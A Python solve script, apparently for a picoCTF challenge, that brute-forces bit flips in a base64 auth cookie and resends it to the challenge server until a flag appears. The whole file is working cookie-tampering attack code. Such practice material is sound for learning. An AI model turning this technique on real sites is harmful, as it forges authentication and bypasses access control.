import requests
import base64


base64cookie = "OGxFdGMvQ3ozclY4VnZiQ2J3M0w4QmJtbXlDTStERWR2d2xFKysrK1NNM2xYbXpIL2FwSmZCUVliTlV3MHRKbEx3bWFVNjhENmhTbzM4aVEyRWJqM2F6Vk5HRXhvMFh4MVIzOFBrNFovSlBFa3graGFvMU0xYWVRS1lZKzFxWGw="

def bitflip(pos, bit, data):
    raw  = base64.b64decode(data).decode('utf-8')
    list1 = list(raw)
    p = f'{list1[pos]}'
    list1[pos] = chr(ord(p) ^ bit)
    return base64.b64encode(("".join(list1)).encode('utf-8')).decode('utf-8')

def main():
  for i in range(128):
    for j in range(128):
      cookie = bitflip(i, j, base64cookie)
      print(cookie)
      r = requests.get("http://mercury.picoctf.net:56136/", cookies={"auth_name": cookie})
      if "picoCTF{" in r.text:
        print(r.text)
        exit(0)

if __name__ == "__main__":
  main()

    